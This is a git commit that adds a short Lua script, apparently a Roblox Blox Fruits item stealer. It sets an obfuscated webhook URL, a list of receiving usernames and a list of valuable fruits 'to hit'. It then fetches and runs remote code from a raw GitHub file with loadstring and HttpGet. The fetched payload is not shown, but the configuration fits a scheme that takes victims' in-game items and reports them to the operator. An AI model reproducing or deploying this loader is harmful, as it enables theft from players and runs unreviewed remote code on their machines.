08f437f485b4e054d27a9ed740e70ceec7f8468e
AZURICJOKER <badbloxify@gmail.com>
2025-04-11 21:55:22 +0545

    Create Freezeure.lua

---
+++ Freezeure.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=bnhqQjFoZnFXOTRYTnMxMDhJOURvQTpnTFY5bXR0dDlXYXhDLWo4aFVQZlh5S2ZRWFNYUTJkOWU5cjRJenNSamNPVC04VWx3LVRfeWxzWi10M2tGZ0Z3MFFQQThsLVFlWUdlZ2J6OXBaRTRmbmRvclN4YWpQSDBKSXZjUmt1Y1EyLWZZX1NZbHR5WjVMTURsOXRmdmZ2QnRCUklVMm4wMGNTQnVpWFFvR2gzcDJQNUhLNWZyUGRZUTRjZHZTbHFmWHM" -- << Your Webhook
+Usernames = {"SKYWARSPLAYER109", ""} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon", "Dough-Dough", "Trex-Trex", "Shadow-Shadow", "Mammoth-Mammoth"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
